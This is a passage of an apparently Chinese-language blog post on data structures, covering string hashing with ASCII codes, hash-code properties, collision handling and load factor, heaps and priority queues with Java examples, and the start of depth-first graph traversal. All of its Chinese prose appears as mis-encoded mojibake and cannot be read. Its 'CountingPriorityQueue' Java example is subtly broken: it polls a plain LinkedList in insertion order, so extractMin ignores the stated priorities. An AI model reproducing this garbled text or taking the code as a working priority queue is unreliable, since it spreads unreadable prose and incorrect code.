&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œè¿™ä¸ªæ•°æ®ç»“æ„å ç”¨ç©ºé—´å¤§ã€å­˜å‚¨æ•°æ®ç±»å‹å•ä¸€ã€æµªè´¹èµ„æºï¼Œä½†æ˜¯å´ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå¾ˆå¥½çš„æ€è·¯ã€‚</p><h2 id="DataIndexedStringSet"><a href="#DataIndexedStringSet" class="headerlink" title="DataIndexedStringSet"></a>DataIndexedStringSet</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åœ¨æ•°æ®ç»“æ„ä¸­æ’å…¥<em>String</em>ç±»å‹çš„æ•°æ®ã€‚</p><p>åŸºäºä¸Šé¢çš„æ€æƒ³ï¼Œæˆ‘ä»¬ä¹Ÿè€ƒè™‘ä½¿ç”¨ä¸€ä¸ªç®—æ³•å°†æ¯ä¸€ä¸ªStringè½¬åŒ–æˆå”¯ä¸€çš„ä¸€ä¸ªIntegerã€‚æ¯”å¦‚æˆ‘ä»¬ä¸ºæ¯ä¸€ä¸ªè‹±æ–‡å­—æ¯å’Œç¬¦å·åˆ†é…ä¸€ä¸ªæ•°å€¼ï¼Œç”¨æ•°å€¼åŠ å’Œå¾—å‡ºçš„ç»“æœæ¥ä»£è¡¨è¿™ä¸ªå•è¯ã€‚</p><p>è¿™é‡Œå¾ˆè‡ªç„¶çš„æˆ‘ä»¬æƒ³åˆ°åˆ©ç”¨<strong>ASCIIç </strong>æ¥å¤„ç†ã€‚</p><p>åœ¨ç®—æ³•æ–¹é¢ï¼Œæˆ‘ä»¬è€ƒè™‘å€Ÿé‰´è¿›åˆ¶çš„å®šä¹‰ï¼Œæ¯”å¦‚åè¿›åˆ¶åˆ©ç”¨0åˆ°9çš„åä¸ªæ•°å­—è¡¨ç¤ºå‡ºæ‰€æœ‰è‡ªç„¶æ•°ã€‚æˆ‘ä»¬ä»¥ 126 ä¸ºåŸºï¼Œè¿™æ · â€œcatâ€ ä¾¿å¯ä»¥è¡¨ç¤ºä¸ºï¼š</p><p>$$cat &#x3D; char(c)\times 126^{2}+char(a)\times 126^{1}+char(t)\times 126^{0}$$</p><p>å…¶ä¸­charä»£è¡¨å¯¹åº”çš„ASCIIç å€¼ã€‚</p><p>è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨intä»£æ›¿Stringï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥ç”¨intè¿›è¡Œå­˜å‚¨ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å‚¨å­˜ä¸­æ–‡ï¼Œæœ€å¤§çš„å¯èƒ½ç¬¦å·æœ‰ <strong>40959</strong> ç§ï¼Œæ„å‘³ç€æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤§äº39ä¸‡äº¿çš„æ•°ç»„å­˜å‚¨ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸ç°å®çš„ï¼</p><h2 id="Hash-Code"><a href="#Hash-Code" class="headerlink" title="Hash Code"></a>Hash Code</h2><p>å¯¹äºå°èŒƒå›´çš„å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ•°ç»„æ¥åŒºåˆ†æ¯ä¸ªå“ˆå¸Œå€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ•°ç»„ä¸­çš„æ¯ä¸ªç´¢å¼•éƒ½ä»£è¡¨ä¸€ä¸ªå”¯ä¸€çš„å“ˆå¸Œå€¼ã€‚å¦‚æœæˆ‘ä»¬çš„æŒ‡æ•°å¾ˆå°å¹¶ä¸”æ¥è¿‘äºé›¶ï¼Œé‚£ä¹ˆè¿™ç§æ–¹æ³•å¾ˆæœ‰æ•ˆã€‚</p><p>å‡è®¾æˆ‘ä»¬åªæƒ³æ”¯æŒé•¿åº¦ä¸º 10 çš„æ•°ç»„ï¼Œä»¥é¿å…åˆ†é…è¿‡å¤šçš„å†…å­˜ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¾é å–æ¨¡è¿ç®—å®ç°è¿™ä¸€ç‚¹ã€‚</p><p>æ‰€ä»¥è¦åˆ›å»ºæœ‰æ•ˆçš„å“ˆå¸Œç ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘ä¸‹è¿°ç»´åº¦ï¼š</p><ol><li>Deterministic:ç¡®å®šæ€§ï¼Œä¸¤ä¸ªç›¸ç­‰çš„å¯¹è±¡ A å’Œ B ( A.equals(B) &#x3D;&#x3D; true ) çš„ hashCode() å‡½æ•°å…·æœ‰ç›¸åŒçš„å“ˆå¸Œç ã€‚</li><li>Consistent:æ¯æ¬¡åœ¨å¯¹è±¡çš„åŒä¸€å®ä¾‹ä¸Šè°ƒç”¨ hashCode() å‡½æ•°æ—¶ï¼Œå®ƒéƒ½ä¼šè¿”å›ç›¸åŒçš„æ•´æ•°ã€‚</li></ol><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¦‚æœéœ€è¦æ‹¥æœ‰é«˜æ•ˆçš„å“ˆå¸Œç ï¼Œæˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥è€ƒè™‘ä»¥ä¸‹é—®é¢˜ï¼š</p><ol><li>hashCode() å‡½æ•°å¿…é¡»æœ‰æ•ˆã€‚</li><li>hashCode() å‡½æ•°å€¼åº”å°½å¯èƒ½å‡åŒ€åœ°åˆ†å¸ƒåœ¨æ‰€æœ‰æ•´æ•°çš„é›†åˆä¸Šã€‚</li><li>hashCode() å‡½æ•°çš„è®¡ç®—é€Ÿåº¦åº”è¯¥ç›¸å¯¹è¾ƒå¿«[ç†æƒ³æƒ…å†µä¸‹ä¸º $O(1)$ å¸¸æ•°æ—¶é—´æ•°å­¦è¿ç®—]</li></ol><p>ç”±äºæ•°æ®æº¢å‡ºç­‰ç‰¹æ®Šæƒ…å†µï¼Œå‡ºç°å†²çªæ˜¯ä¸å¯é¿å…çš„ã€‚å¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹æ–¹å¼è¿›è¡Œå¤„ç†ï¼š</p><ol><li><p>çº¿æ€§æ¢æµ‹ï¼šå°†å†²çªé”®å­˜å‚¨åœ¨æ•°ç»„ä¸­çš„å…¶ä»–ä½ç½®ï¼Œå¯èƒ½å­˜å‚¨åœ¨ä¸‹ä¸€ä¸ªå¼€æ”¾æ•°ç»„ç©ºé—´ä¸­ã€‚è¿™ç§æ–¹æ³•å¯ä»¥é€šè¿‡åˆ†å¸ƒå¼å“ˆå¸Œè¡¨çœ‹åˆ°ã€‚</p></li><li><p>å¤–éƒ¨é“¾æ¥ï¼šä¸€ä¸ªæ›´ç®€å•çš„è§£å†³æ–¹æ¡ˆæ˜¯å°†å…·æœ‰ç›¸åŒå“ˆå¸Œå€¼çš„æ‰€æœ‰é”®ä¸€èµ·å­˜å‚¨åœ¨å®ƒä»¬è‡ªå·±çš„é›†åˆä¸­ï¼Œä¾‹å¦‚ <em>LinkedList</em> ã€‚è¿™ç§å…±äº«å•ä¸ªç´¢å¼•çš„æ¡ç›®é›†åˆç§°ä¸º<strong>å­˜å‚¨æ¡¶</strong>ã€‚</p></li></ol><p>å¯¹äºå“ˆå¸Œè¡¨ï¼Œä¸€æ—¦è¡¨ä¸­æ•°æ®è¶Šæ¥è¶Šå€¾å‘äºé¥±å’Œï¼Œå‘ç”Ÿå†²çªå’Œé”™è¯¯çš„å¯èƒ½æ€§å°±è¶Šå¤§ã€‚å› æ­¤ï¼ŒåŠ¨æ€è°ƒæ•´å“ˆå¸Œè¡¨çš„å¤§å°æ˜¯ååˆ†å¿…è¦çš„ã€‚</p><p>ä¸ºäº†è·Ÿè¸ªå“ˆå¸Œè¡¨çš„å¡«å……ç¨‹åº¦ï¼Œæˆ‘ä»¬å®šä¹‰äº†æœ¯è¯­è´Ÿè½½å› å­ï¼Œå®ƒæ˜¯æ’å…¥çš„å…ƒç´ æ•°é‡ä¸æ•°ç»„æ€»ç‰©ç†é•¿åº¦çš„æ¯”ç‡ã€‚</p><p>$$load \ factor&#x3D;\frac{size()}{array.length}$$</p><p>å¯¹äºæˆ‘ä»¬çš„å“ˆå¸Œè¡¨ï¼Œæˆ‘ä»¬å°†å®šä¹‰å…è®¸çš„æœ€å¤§è´Ÿè½½å› å­ã€‚å¦‚æœæ·»åŠ å¦ä¸€ä¸ªé”®å€¼å¯¹ä¼šå¯¼è‡´è´Ÿè½½å› å­è¶…è¿‡æŒ‡å®šçš„æœ€å¤§è´Ÿè½½å› å­ï¼Œåˆ™åº”è°ƒæ•´å“ˆå¸Œè¡¨çš„å¤§å°ã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡å°†åŸºç¡€æ•°ç»„é•¿åº¦åŠ å€æ¥å®Œæˆçš„ã€‚ Java é»˜è®¤çš„æœ€å¤§è´Ÿè½½å› å­æ˜¯ 0.75ï¼Œå®ƒåœ¨åˆç†å¤§å°çš„æ•°ç»„å’Œå‡å°‘å†²çªä¹‹é—´æä¾›äº†è‰¯å¥½çš„å¹³è¡¡ã€‚</p><h1 id="Heaps-and-Priority-Queues"><a href="#Heaps-and-Priority-Queues" class="headerlink" title="Heaps and Priority Queues"></a>Heaps and Priority Queues</h1><p>åœ¨äºŒå‰æœç´¢æ ‘BSTä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé«˜æ•ˆåœ°æœç´¢åˆ°éœ€è¦çš„å…ƒç´ ï¼Œåªéœ€è¦ $\log{}{N}$ çš„æ—¶é—´å¤æ‚åº¦ã€‚å¦‚æœæˆ‘ä»¬æ›´åŠ å…³å¿ƒå¿«é€Ÿæ‰¾åˆ°æœ€å°æˆ–æœ€å¤§å…ƒç´ è€Œä¸æ˜¯å¿«é€Ÿæœç´¢æ€ä¹ˆåŠï¼Ÿ</p><h2 id="Priority-Queue"><a href="#Priority-Queue" class="headerlink" title="Priority Queue"></a>Priority Queue</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¼˜å…ˆé˜Ÿåˆ—çš„æ¥å£ï¼šåœ¨æˆ‘ä»¬å®šä¹‰çš„æœ€å°ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼Œæˆ‘ä»¬åªèƒ½ä¸é˜Ÿåˆ—ä¸­çš„æœ€å°å…ƒç´ è¿›è¡Œäº¤äº’ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/** (Min) Priority Queue: Allowing tracking and removal of </span><br><span class="hljs-comment">  * the smallest item in a priority queue. */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MinPQ</span>&lt;Item&gt; &#123;<br>    <span class="hljs-comment">/** Adds the item to the priority queue. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(Item x)</span>;<br>    <span class="hljs-comment">/** Returns the smallest item in the priority queue. */</span><br>    <span class="hljs-keyword">public</span> Item <span class="hljs-title function_">getSmallest</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">/** Removes the smallest item from the priority queue. */</span><br>    <span class="hljs-keyword">public</span> Item <span class="hljs-title function_">removeSmallest</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">/** Returns the size of the priority queue. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è€ƒè™‘ä½¿ç”¨å·²ç»å­¦ä¹ è¿‡çš„æ•°æ®ç»“æ„è¿›è¡Œå®ç°ï¼š</p><ol><li>Ordered Array æœ‰åºæ•°ç»„</li><li>BST äºŒå‰æœç´¢æ ‘</li><li>HashTable å“ˆå¸Œè¡¨</li></ol><h2 id="Heaps"><a href="#Heaps" class="headerlink" title="Heaps"></a>Heaps</h2><p>ç»è¿‡æ¯”è¾ƒï¼Œæˆ‘ä»¬å‘ç°BSTå…·æœ‰å·²çŸ¥çš„æœ€ä½³è¿è¡Œæ•ˆç‡ã€‚æˆ‘ä»¬è€ƒè™‘åœ¨BSTçš„åŸºç¡€ä¸Šç»§ç»­è¿›è¡Œæ”¹è¿›ï¼Œå¯ä»¥è¿›ä¸€æ­¥æé«˜è¿™äº›æ“ä½œçš„è¿è¡Œæ—¶é—´æ•ˆç‡ã€‚</p><p>æˆ‘ä»¬å®šä¹‰ Heap çš„æ•°æ®ç»“æ„ï¼Œè¿™æ˜¯ä¸€ç§<strong>å®Œå…¨äºŒå‰æ ‘</strong>ï¼Œå³å…·æœ‰ï¼š</p><ol><li>å †åºæ€§è´¨ï¼ˆHeap Propertyï¼‰ï¼šåœ¨å †ä¸­ï¼Œå¯¹äºæ¯ä¸ªèŠ‚ç‚¹ iï¼Œçˆ¶èŠ‚ç‚¹çš„é”®å€¼å°äºæˆ–ç­‰äºï¼ˆå°é¡¶å †ï¼‰æˆ–å¤§äºæˆ–ç­‰äºï¼ˆå¤§é¡¶å †ï¼‰å…¶å­èŠ‚ç‚¹çš„é”®å€¼ã€‚</li><li>å®Œå…¨äºŒå‰æ ‘ç»“æ„ï¼ˆComplete Binary Tree Structureï¼‰ï¼šå †æ˜¯ä¸€ç§å®Œå…¨äºŒå‰æ ‘ï¼Œå³é™¤äº†æœ€åº•å±‚èŠ‚ç‚¹ï¼Œå…¶ä»–å±‚çš„èŠ‚ç‚¹éƒ½æ˜¯æ»¡çš„ï¼Œæœ€åº•å±‚èŠ‚ç‚¹éƒ½å°½å¯èƒ½åœ°é å·¦æ’åˆ—ã€‚</li></ol><p>å †åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼šæœ€å°å †å’Œæœ€å¤§å †ã€‚åœ¨æœ€å°å †ä¸­ï¼Œçˆ¶èŠ‚ç‚¹çš„é”®å€¼å§‹ç»ˆå°äºæˆ–ç­‰äºå…¶å­èŠ‚ç‚¹çš„é”®å€¼ï¼›è€Œåœ¨æœ€å¤§å †ä¸­ï¼Œçˆ¶èŠ‚ç‚¹çš„é”®å€¼å§‹ç»ˆå¤§äºæˆ–ç­‰äºå…¶å­èŠ‚ç‚¹çš„é”®å€¼ã€‚</p><p>Javaå®ç°æœ€å°ä¼˜å…ˆé˜Ÿåˆ—çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MinPriorityQueue</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Comparable</span>&lt;T&gt;&gt; &#123;<br>    <span class="hljs-keyword">private</span> PriorityQueue&lt;T&gt; heap;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MinPriorityQueue</span><span class="hljs-params">()</span> &#123;<br>        heap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(T item)</span> &#123;<br>        heap.offer(item);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">extractMin</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> heap.poll();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">peekMin</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> heap.peek();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸è°ƒç”¨å°è£…å¥½çš„ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è®¡æ•°å™¨çš„æ€æƒ³å®ç°ä¼˜å…ˆçº§ã€‚å³ï¼šè®¡æ•°å™¨åœ¨æ¯æ¬¡æ’å…¥é¡¹ç›®æ—¶éƒ½ä¼šé€’å¢ã€‚æœ€è¿‘æ’å…¥çš„é¡¹ç›®å§‹ç»ˆå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œå› æ­¤å®ƒä»¬å°†é¦–å…ˆè¢«åˆ é™¤ã€‚</p><p>ä¸€ä¸ªå¯èƒ½çš„ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.LinkedList;<br><span class="hljs-keyword">import</span> java.util.Queue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CountingPriorityQueue</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">private</span> Queue&lt;Element&lt;T&gt;&gt; queue;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CountingPriorityQueue</span><span class="hljs-params">()</span> &#123;<br>        queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>        count = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(T item, <span class="hljs-type">int</span> priority)</span> &#123;<br>        queue.offer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Element</span>&lt;&gt;(item, priority, count++));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">extractMin</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (queue.isEmpty())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        Element&lt;T&gt; minElement = queue.poll();<br>        <span class="hljs-keyword">return</span> minElement.item;<br>    &#125;<br><br>    <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå†…éƒ¨ç±»æ¥è¡¨ç¤ºå¸¦æœ‰ä¼˜å…ˆçº§å’Œæ’å…¥é¡ºåºçš„å…ƒç´ </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Element</span>&lt;E&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparable</span>&lt;Element&lt;E&gt;&gt; &#123;<br>        E item;<br>        <span class="hljs-type">int</span> priority;<br>        <span class="hljs-type">int</span> insertionOrder;<br><br>        Element(E item, <span class="hljs-type">int</span> priority, <span class="hljs-type">int</span> insertionOrder) &#123;<br>            <span class="hljs-built_in">this</span>.item = item;<br>            <span class="hljs-built_in">this</span>.priority = priority;<br>            <span class="hljs-built_in">this</span>.insertionOrder = insertionOrder;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compareTo</span><span class="hljs-params">(Element&lt;E&gt; other)</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.priority != other.priority) &#123;<br>                <span class="hljs-keyword">return</span> Integer.compare(<span class="hljs-built_in">this</span>.priority, other.priority);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> Integer.compare(<span class="hljs-built_in">this</span>.insertionOrder, other.insertionOrder);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬è€Œè¨€ï¼ŒHeapæœ‰å¦‚ä¸‹çš„æ€§è´¨ä½¿å¾—å®ƒèƒ½å¾ˆæ–¹ä¾¿åœ°å®ç°ä¼˜å…ˆé˜Ÿåˆ—çš„æ•°æ®ç»“æ„ï¼š</p><ol><li><p>é«˜æ•ˆçš„æ’å…¥å’Œåˆ é™¤æ“ä½œï¼šå †çš„æ’å…¥å’Œåˆ é™¤æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º $O(log n)$ ï¼Œå…¶ä¸­næ˜¯å †ä¸­å…ƒç´ çš„æ•°é‡ã€‚è¿™ä½¿å¾—å †éå¸¸é€‚åˆç”¨äºå®ç°ä¼˜å…ˆé˜Ÿåˆ—ï¼Œå› ä¸ºåœ¨ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æ’å…¥å’Œåˆ é™¤å…ƒç´ ã€‚</p></li><li><p>å¿«é€Ÿè®¿é—®æœ€å°ï¼ˆæˆ–æœ€å¤§ï¼‰å…ƒç´ ï¼šå †å…è®¸åœ¨å¸¸æ•°æ—¶é—´å†… $O(1)$ è®¿é—®å †é¡¶å…ƒç´ ï¼Œè¿™æ˜¯å› ä¸ºå †çš„æ ¹èŠ‚ç‚¹å§‹ç»ˆæ˜¯æœ€å°ï¼ˆæˆ–æœ€å¤§ï¼‰çš„å…ƒç´ ã€‚è¿™å¯¹äºä¼˜å…ˆé˜Ÿåˆ—æ¥è¯´éå¸¸é‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬ç»å¸¸éœ€è¦çŸ¥é“å½“å‰é˜Ÿåˆ—ä¸­ä¼˜å…ˆçº§æœ€é«˜çš„å…ƒç´ ã€‚</p></li><li><p>è‡ªåŠ¨ç»´æŠ¤é¡ºåºï¼šå †å…·æœ‰è‡ªæˆ‘è°ƒæ•´çš„æ€§è´¨ï¼Œå³åœ¨æ’å…¥æˆ–åˆ é™¤å…ƒç´ åï¼Œå †ä¼šè‡ªåŠ¨è°ƒæ•´å…¶ç»“æ„ä»¥ä¿æŒå †çš„æ€§è´¨ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸éœ€è¦æ‰‹åŠ¨ç»´æŠ¤å †çš„é¡ºåºï¼Œä»è€Œç®€åŒ–äº†ä»£ç å®ç°ã€‚</p></li><li><p>æ”¯æŒåŠ¨æ€å¤§å°ï¼šå †å¯ä»¥åŠ¨æ€åœ°è°ƒæ•´å¤§å°ï¼Œå› æ­¤å¯ä»¥å®¹çº³ä»»æ„æ•°é‡çš„å…ƒç´ ã€‚è¿™ä½¿å¾—å †éå¸¸é€‚åˆç”¨äºå®ç°ä¼˜å…ˆé˜Ÿåˆ—ï¼Œå› ä¸ºæˆ‘ä»¬é€šå¸¸ä¸çŸ¥é“åœ¨é˜Ÿåˆ—ä¸­éœ€è¦å­˜å‚¨å¤šå°‘å…ƒç´ ã€‚</p></li></ol><p>ä¸€äº›æœ‰æ„æ€çš„ç‚¹ï¼š<br>æŒ‰é™åºæ’åºçš„æ•°ç»„æ˜¯æœ€å¤§å †ï¼ˆæ ¹æ˜¯æœ€å¤§å€¼ï¼Œå€¼æŒ‰çº§åˆ«é¡ºåºé€’å‡ï¼‰ã€‚</p><h1 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h1><p>ä¸€èˆ¬æ¥è¯´ï¼Œå›¾ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p><ol><li>ä¸€ç»„èŠ‚ç‚¹</li><li>ä¸€ç»„è¾¹ï¼Œæœ‰å‘æˆ–æ— å‘</li></ol><p>æ‰€æœ‰æ ‘ä¹Ÿæ˜¯å›¾ï¼Œä½†å¹¶éæ‰€æœ‰å›¾éƒ½æ˜¯æ ‘ã€‚</p><p>å¯¹äºå›¾ï¼Œæˆ‘ä»¬ä¸€èˆ¬è€ƒè™‘ä¸‹åˆ—é—®é¢˜ï¼š</p><ol><li>è·¯å¾„ï¼šé¡¶ç‚¹ s å’Œ t ä¹‹é—´æ˜¯å¦å­˜åœ¨è·¯å¾„ï¼Ÿ</li><li>è¿é€šæ€§ï¼šå›¾æ˜¯å¦è¿é€šï¼Œå³æ‰€æœ‰é¡¶ç‚¹ä¹‹é—´æ˜¯å¦å­˜åœ¨è·¯å¾„ï¼Ÿ</li><li>åŒè¿é€šæ€§ï¼šæ˜¯å¦å­˜åœ¨åˆ é™¤æŸä¸ªé¡¶ç‚¹ä¼šæ–­å¼€å›¾çš„è¿æ¥ï¼Ÿ</li><li>æœ€çŸ­ s-t è·¯å¾„ï¼šé¡¶ç‚¹ s å’Œ t ä¹‹é—´çš„æœ€çŸ­è·¯å¾„æ˜¯å¤šå°‘ï¼Ÿ</li><li>ç¯è·¯æ£€æµ‹ï¼šå›¾è¡¨ä¸­æ˜¯å¦å­˜åœ¨ç¯è·¯ï¼Ÿ</li><li>åŒæ„ï¼šä¸¤ä¸ªå›¾æ˜¯å¦åŒæ„ï¼ˆåŒæ„å›¾ï¼‰ï¼Ÿ</li></ol><p>æ€»ä½“æ¥è¯´ï¼Œæœ€æ ¹æœ¬çš„è¿˜æ˜¯ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬å¦‚ä½•éå†å›¾ï¼Ÿ</p><h2 id="Graph-traversal"><a href="#Graph-traversal" class="headerlink" title="Graph traversal"></a>Graph traversal</h2><p>æˆ‘ä»¬å…ˆå…³æ³¨ç¬¬ä¸€ä¸ªé—®é¢˜:å¦‚ä½•ç¡®å®šä¸¤ä¸ªèŠ‚ç‚¹ $s$ å’Œ $t$ ä¹‹é—´æ˜¯å¦å­˜åœ¨è·¯å¾„.</p><p>æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªå‡½æ•°ï¼šå®ƒæ¥å—ä¸¤ä¸ªé¡¶ç‚¹å¹¶è¿”å›ä¸¤è€…ä¹‹é—´æ˜¯å¦å­˜åœ¨è·¯å¾„ã€‚å®ç°è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸ºå‚è€ƒèŠ‚ç‚¹ï¼Œç„¶åè®¿é—®ä»–çš„ä¸€ä¸ªé‚»å±…èŠ‚ç‚¹å¹¶å°†è‡ªå·±æ ‡è®°ä¸ºå·²æŸ¥æ‰¾ã€‚ä¹‹åå¯¹ç¬¬äºŒä¸ªèŠ‚ç‚¹é€’å½’çš„è°ƒç”¨è¯¥å‡½æ•°çŸ¥é“æ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹æˆ–éå†å®Œæ•´ä¸ªè·¯å¾„ï¼ˆæ‰€æœ‰èŠ‚ç‚¹å‡è¢«æ ‡è®°ï¼‰ã€‚</p><p>å…·ä½“è€Œè¨€ï¼Œå¯ä»¥æ‹†è§£ä¸ºä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>ä»å›¾ä¸­çš„æŸä¸ªé¡¶ç‚¹å¼€å§‹éå†ï¼Œå°†è¯¥é¡¶ç‚¹æ ‡è®°ä¸ºå·²è®¿é—®ã€‚</li><li>é€’å½’åœ°å¯¹è¯¥é¡¶ç‚¹çš„æœªè®¿é—®é‚»å±…é¡¶ç‚¹è¿›è¡Œæ·±åº¦ä¼˜å…ˆéå†ã€‚</li><li>é‡å¤æ­¥éª¤2ï¼Œç›´åˆ°è¯¥é¡¶ç‚¹çš„æ‰€æœ‰é‚»å±…é¡¶ç‚¹éƒ½è¢«è®¿é—®è¿‡ã€‚</li><li>å›æº¯åˆ°ä¸Šä¸€ä¸ªé¡¶ç‚¹ï¼Œé‡å¤æ­¥éª¤2å’Œæ­¥éª¤3ï¼Œç›´åˆ°å›¾ä¸­çš„æ‰€æœ‰é¡¶ç‚¹éƒ½è¢«è®¿é—®è¿‡ã€‚</li></ol><p>äº‹å®ä¸Šï¼Œè¿™æ­£æ˜¯å›¾çš„<strong>æ·±åº¦ä¼˜å…ˆéå†ç®—æ³•ï¼ˆDepth-First Searchï¼ŒDFSï¼‰</strong>ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨ä¼ªä»£ç æ¥å®ç°ä¸€ä¸‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 